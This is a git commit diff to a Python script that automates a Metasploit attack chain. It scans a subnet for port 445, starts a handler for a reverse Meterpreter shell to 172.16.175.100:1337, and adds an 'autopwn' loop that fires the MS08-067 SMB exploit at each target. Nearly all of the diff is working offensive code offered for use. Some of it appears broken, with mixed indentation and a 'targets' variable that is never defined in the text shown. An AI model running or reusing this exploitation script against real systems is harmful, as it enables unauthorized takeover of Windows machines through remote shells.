499416b69ad26099652a4f91517962f6a2dd7f2c
gaudard <gaudard@gmail.com>
2014-09-03 07:19:25 -0400

    updated

--- Python/msfcli.py
+++ Python/msfcli.py
@@ -16,6 +16,7 @@ payload = 'windows/meterpreter/reverse_tcp'
  
 ### Scans target network for open port 445
 def scanner(ipsub, ipnet1, ipnet2, portrange):
+	print('running scanner')
         for octect in range(ipnet1,ipnet2):
                 test = ipsub + '.' + str(octect)
                 for port in range(portrange, portrange + 1):
@@ -33,7 +34,19 @@ def scanner(ipsub, ipnet1, ipnet2, portrange):
 ### Starts MSF Handler
 def msfhandler():
         print('Starting Handler')
-        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.1.7 lport=1337 E'))
+        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler payload=windows/meterpreter/reverse_tcp lhost=172.16.175.100 lport=1337 E'))
        
  
+### the autopwn
+def autopwn(targets):
+	print('starting to autopwn targets')
+	for target in targets:
+		subprocess.Popen(shlex.split('msfcli windows/smb/ms08_067_netapi payload=windows/meterpreter/reverse_tcp rhost=%s lhost=172.16.175.100 lport=1337 DisablePayloadHandler=true E' % target))
+	
+
+
 msfhandler()
+scanner('172.16.175', 9, 11, 445)
+autopwn(targets)
+
+
